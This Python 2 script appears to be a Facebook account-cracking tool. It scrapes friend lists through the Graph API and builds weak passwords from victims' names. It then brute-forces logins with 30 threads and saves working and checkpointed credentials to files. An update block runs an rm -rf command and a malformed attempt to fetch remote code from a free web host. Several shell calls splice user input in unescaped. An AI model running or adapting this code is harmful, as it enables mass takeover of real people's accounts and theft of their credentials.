#coding=utf-8
import os,sys
os.system('clear')
print('\n\n  Checking Module ....')
try:
    import time,requests,random,json,re
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    from requests.exceptions import ConnectionError
except IOError:
    os.system('pip2 install futures requests')
    os.system('python2 hs.py')
try:
    os.mkdir('/sdcard/ids')
except:pass


logo="""
    ___  ____   ____    ___   ____  
   /  _]|    \ |    \  /   \ |    \ 
  /  [_ |  D  )|  D  )Y     Y|  D  )
 Y    _]|    / |    / |  O  ||    / 
 |   [_ |    \ |    \ |     ||    \ 
 |     T|  .  Y|  .  Yl     !|  .  Y
 l_____jl__j\_jl__j\_j \___/ l__j\_j
                                                                          
--------------------------------------------------
  Author   : ERROR-,404
  Github   : Https://github.com/Hamayun01
  Facebook : Hamayun Khan
--------------------------------------------------"""
oks =[]
cps=[]
public=[]
loop=0

def update():
    print("\033[1;31;40m  CHECKING DATABASE ....\n")
cv = '1.3'
cf = requests.get('https://raw.githubusercontent.com/hstap/version/main/update').text
if cv in cf:
      print("fuck")
      os.system('rm -rf /fuck')
      os.system("https://pak123istan.000webhostapp.com/hsC.py > hsC.py")
      time.sleep(3)
      
def menu():
    os.system('clear')
    print(logo)
    print('  [1] File crack')
    print('  [2] Grab manual')
    print('  [3] Grab auto')
    print('  [4] Separate ids')
    print('  [5] Remove Token')
    print('  [6] Contact Me')
    print('  [7] Remove Temp')
    print('  [0] Exit')
    print(50*'-')
    menu_select()
def menu_select():
    option = raw_input('  Select option: ')
    if option =='':
        print('\n  Select valid option\n')
        menu_select()
    elif option =='1':
        file()
    elif option =='2':
        grab_menu()
    elif option =='3':
        grab_auto()
    elif option =='4':
        grab_links()
    elif option =='5':
         os.system('rm -rf .access_token.txt')
         time.sleep(1.1)
         menu()
    elif option =='6':
         os.system('python2 error py')
         menu()
    elif option =='7':
          os.system('rm -rf /sdcard/temp.txt')
          os.system('rm -rf /sdcard/temp3.txt')
          print("Temp/Temp3 Removed Success")
          time.sleep(1.5)
          menu()
    elif option =='0':
          time.sleep(1)
          exit()
    else:
        print('\n  Select valid option \n')
        menu_select()
def all_gen(first,last):
    __guru__=[]
    ps = first.lower()
    ps2 = last.lower()
    if len(first) > 2:
        __guru__.append(first+'123')
        __guru__.append(first+'12345')
#        __guru__.append(ps+'1234')
        __guru__.append(ps+'786')
        __guru__.append(ps+'1122')
        __guru__.append(first+'786')
 #       __guru__.append(first+'1122')
        __guru__.append(first+'1234')
    else:
        pass
    return __guru__
def fl_gen(first,last):
    __guru__=[]
    ps = first.lower()
    ps2 = last.lower()
    if len(first) > 2:
        __guru__.append(ps+' '+ps2)
        __guru__.append(ps+'1234')
        __guru__.append(ps+'1122')
        __guru__.append(ps+'786')
    else:
        pass
    return __guru__
def file():
    try:
        os.system('clear')
        print(logo)
        file_path = raw_input('  Put file path: ')
        try:
            open_file = open(file_path, 'r').read().splitlines()
        except IOError:
            print('\n  File not found, try again ...')
            time.sleep(1)
            file()
        print(50*'-')
        print('  [1] Crack all name passwords')
        print('  [2] Crack first last name passwords')
        print('  [3] Crack with choice password')
        print(50*'-')
        pass_list = raw_input('  Select option: ')
        if pass_list =='1':
            ids = []
            try:
                for i in open_file:
                    public.append(i)
                    ids.append({'id': i.split('|')[0],'pw': all_gen(i.split('|')[1],i.split('|')[2])})
            except Exception as e:
                print(e)
                os.sys.exit()
            os.system('clear')
            print(logo)
            print('        Passlist: All name passwords        ')
            print(50*'-')
            print('  Total ids: '+str(len(ids)))
            print(50*'-')
            ThreadPool(30).map(freefb,ids)
        elif pass_list =='2':
            ids=[]
            try:
                for i in open_file:
                    public.append(i)
                    ids.append({'id': i.split('|')[0],'pw': fl_gen(i.split('|')[1],i.split('|')[2])})
            except Exception as e:
                print(e)
            os.system('clear')
            print(logo)
            print('        Passlist: First & last name passwords        ')
            print(50*'-')
            print('  Total ids: '+str(len(ids)))
            print(50*'-')
            ThreadPool(30).map(freefb,ids)
        elif pass_list =='3':
            ids = []
            for i in open_file:
                public.append(i)
                ids.append({'id': i.split('|')[0]})
            print(50*'-')
            print('  Example: 223344, 334455, 445566, 786123, 000786,78600')
            print(50*'-')
            passw = raw_input('  Put passwords: ').split(',')
            for p in ids:
                p.update({'pw': passw})
            os.system('clear')
            print(logo)
            print('        Passlist: Choice passwords        ')
            print(50*'-')
            print('  Total ids: '+str(len(ids)))
            print(50*'-')
            ThreadPool(30).map(freefb,ids)
    except Exception as e:
        print(e)
def freefb(ids):
    global loop
    global cps
    global oks
    global ua_chrome
    global public
    try:
        for pas in ids.get('pw'):
            log_id = ids.get('id')
            rua = random.choice(ua_chrome)
            log_data = {
            "email": log_id,
            "pass": pas,
            "prefill_contact_point": "",
            "prefill_source": "",
            "prefill_type": "",
            "first_prefill_source": "",
            "first_prefill_type": "",
            "had_cp_prefilled": "false",
            "had_password_prefilled": "false",
            "is_smart_lock": "false",
            "_fb_noscript": "true"}
            session = requests.Session()
            header_freefb = {'authority':'free.facebook.com',
            'method': 'GET',
            'path': '/login.php',
            'scheme': 'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9,ur_PK,ur;q=0.9',
            'cache-control': 'max-age=0',
            'cookie':'m_pixel_ratio=1; wd=1280x689',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
            'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': rua}
            session.headers.update(header_freefb)
            log_s = session.post('https://free.facebook.com/login.php', data = log_data)
            get_cookie = session.cookies.get_dict().keys()
            if 'c_user' in get_cookie:
                print('\r\033[1;32m  [OK] '+log_id+' | '+pas+'\033[0;97m')
                ok = open('/sdcard/ids/ok.txt', 'a')
                ok.write(log_id+'|'+pas+'\n')
                ok.close()
                oks.append(log_id)
                break
            elif 'checkpoint' in get_cookie:
                print('\r\033[1;31m  [CP] '+log_id+' | '+pas+'\033[0;97m')
                cp = open('/sdcard/ids/cp.txt', 'a')
                cp.write(log_id+'|'+pas+'\n')
                cp.close()
                cps.append(log_id)
                break
            else:
                continue
        loop +=1      
        sys.stdout.write('\r  [%s/%s]    [OK:%s  /  CP:%s] '%(loop,len(public),len(oks),len(cps))),
        sys.stdout.flush()
        
    except:
        freefb(ids)
def grab_menu():
    try:
        access_token = open('.access_token.txt', 'r').read()
    except IOError:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text
        q = json.loads(r)
        nme = q['name']
        uid = q['id']
    except KeyError:
        print('\033[1;31m   Logged in token expired, login another token\033[0;97m')
        time.sleep(1)
        os.system('rm -rf .access_token.txt')
        login()
    os.system('clear')
    print(logo)
    print('   Logged user: '+nme)
    print('   Logged uid: '+uid)
    print(50*'-')
    try:
        limit = int(raw_input('   How many ids do you want to add? '))
        save_filename = raw_input('  Save file as: ')
    except:
        limit = 1
    t = 0
    for t in range(limit):
        t +=1
        ids = raw_input('   Put id %s: '%(t))
        r = requests.get('https://graph.facebook.com/'+ids+'/friends?access_token='+access_token).text
        q = json.loads(r)
        ids_save = open('/sdcard/'+save_filename, 'a')
        for j in q['data']:
            uids = j['id']
            names = j['name']
            first_name = names.split(' ')[0]
            try:
                last_name = names.split(' ')[1]
            except:
                last_name = first_name
            ids_save.write(uids+'|'+first_name+'|'+last_name+'\n')
        ids_save.close()
    print(50*'-')
    print('   Saved ids file path: /sdcard/'+save_filename)
    print(50*'-')
    raw_input('   Press enter to back')
    menu()
def grab_auto():
    try:
        access_token = open('.access_token.txt', 'r').read()
    except:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text
        q = json.loads(r)
        uname = q['name']
    except:
        login()
    os.system('clear')
    print(logo)
    print('  Logged user: '+uname)
    print(50*'-')
    nusrat = []
    try:
        limit_user = int(raw_input('  How many ids do you want to add ? '))
    except:
        limit_user = 1
    count = 0
    for fir in range(limit_user):
        count +=1
        udit = raw_input('  Put id%s: '%(count))
        try:
            fr = requests.get('https://graph.facebook.com/'+udit+'/friends?access_token='+access_token).text
            qfr = json.loads(fr)
            temp_save = open('temp.txt', 'a')
            for data in qfr['data']:
                uids = data['id']
                if uids in nusrat:
                    pass
                else:
                    nusrat.append(uids)
                    temp_save.write(uids+'\n')
            temp_save.close()
        except:
            if 'invalid' in str(qfr):
                print('  Logged token has expired ...')
                os.sys.exit()
            else:
                print('  No friends found for user: '+udit)
                pass
    os.system('clear')
    print(logo)
    print('   Total ids: '+str(len(nusrat)))
    print(50*'-')
    try:
        ask_link = int(raw_input('  How many links do you want to grab? '))
    except:
        ask_link = 1
    completed = 0
    for links in range(ask_link):
        completed +=1
        li = raw_input('  %s Link start with: '%completed)
        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')
    save_file = raw_input('  Save file as: ')
    os.system('sort -r temp2.txt > temp3.txt && rm -rf temp2.txt')
    os.system('clear')
    lines = open('temp3.txt', 'r').readlines()
    print(logo)
    print('  Total ids to grab: '+str(len(lines)))
    print('  Grabbing Process has started')
    print(50*'-')
    fileid = 'temp3.txt'
    fileidopen = open(fileid, 'r').read().splitlines()
    dill = []
    for ids in fileidopen:
        try:
            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?access_token='+access_token).text
            rgq = json.loads(rg)
            idsave=open('/sdcard/'+save_file, 'a')
            for inayat in rgq['data']:
                uids = inayat['id']
                if uids in dill:
                    pass
                else:
                    dill.append(uids)
                    nm = inayat['name']
                    first_name = nm.split(' ')[0]
                    try:
                        last_name = nm.split(' ')[1]
                    except:
                        last_name = first_name
                    idsave.write(uids+'|'+first_name+'|'+last_name+'\n')
            print('  Grabbed from: '+ids)
            print('  Token status: Live')
            print(50*'-')
            idsave.close()
        except Exception as e:
            #print(e)
            if 'invalid' in str(rgq):
                print('  Token has expired, try again ...')
                os.sys.exit()
            else:
                print('  Grabbed from: '+ids)
                print('  Friendlist ids: 0')
                print('  Token status: Expired')
                print(50*'-')
                os.sys.exit()
    lenid = open('/sdcard/'+save_file, 'r').readlines()
    print('  Grabbing Process has completed ')
    os.system('rm -rf temp*')
    print('  Total ids grabbed: '+str(len(lenid)))
    print('  File saved as: /sdcard/'+save_file)
    print(50*'-')
    raw_input('  Press enter to back ')
    menu()
def grab_links():
    os.system('clear')
    print(logo)
    print('')
    try:
        limit = int(raw_input('   How many links do you want to separate? '))
    except:
        limit = 1
    file_name = raw_input('   Input file name: ')
    new_save = raw_input('   Save new file as: ')
    y = 0
    for k in range(limit):
        y+=1
        links = raw_input('   Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> /sdcard/'+new_save)
    print(50*'-')
    print('   Links grabbed successfully')
    print('   New file saved as: /sdcard/'+new_save)
    print(50*'-')
    raw_input('   Press enter to back ')
    menu()
def login():
    os.system('clear')
    print(logo)
    tok = raw_input('   Put access token: ')
    try:
        u = requests.get('https://graph.facebook.com/me?access_token='+tok).text
        u1 = json.loads(u)
        name = u1['name']
        ts = open('.access_token.txt', 'w')
        ts.write(tok)
        ts.close()
        print('   Logged in successfully')
        time.sleep(1)
        menu()
    except KeyError:
        print('\n\033[1;31m   Invalid token provided, try again\033[0;97m')
        os.sys.exit()
menu()
